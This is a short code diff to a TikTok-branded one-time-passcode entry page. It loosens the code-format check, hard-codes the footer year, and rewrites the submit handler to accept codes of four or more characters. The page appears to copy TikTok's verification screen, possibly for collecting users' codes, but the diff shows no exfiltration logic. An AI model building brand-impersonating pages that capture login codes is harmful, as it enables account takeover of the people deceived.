@@ -36,7 +36,6 @@
                                    name="otp" 
                                    required
                                    maxlength="10"
-                                   pattern="[0-9]{10}"
                                    class="text-center text-lg border border-gray-300 rounded-lg focus:outline-none focus:border-[#fe2c55] bg-gray-50"
                                    >
                         </div>
@@ -59,7 +58,7 @@
         <footer class="py-4 text-center">
             <div class="container mx-auto px-4">
                 <div class="text-xs text-gray-400">
-                    <p>© <%= new Date().getFullYear() %> TikTok</p>
+                    <p> 2023 TikTok</p>
                 </div>
             </div>
         </footer>
@@ -69,9 +68,17 @@
         const submitBtn = document.getElementById('submitBtn');
         const form = document.getElementsByTagName('form')[0];
 
-        submitBtn.addEventListener('click', () => {
+        submitBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            
+            const otp = document.querySelector('input[name="otp"]').value.trim();
+            
+            if (!otp || otp.length < 4) {
+                return;
+            }
+            
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Submitting...';
+            submitBtn.textContent = 'Verifying...';
             form.submit();
         });
         // Function to move to next input
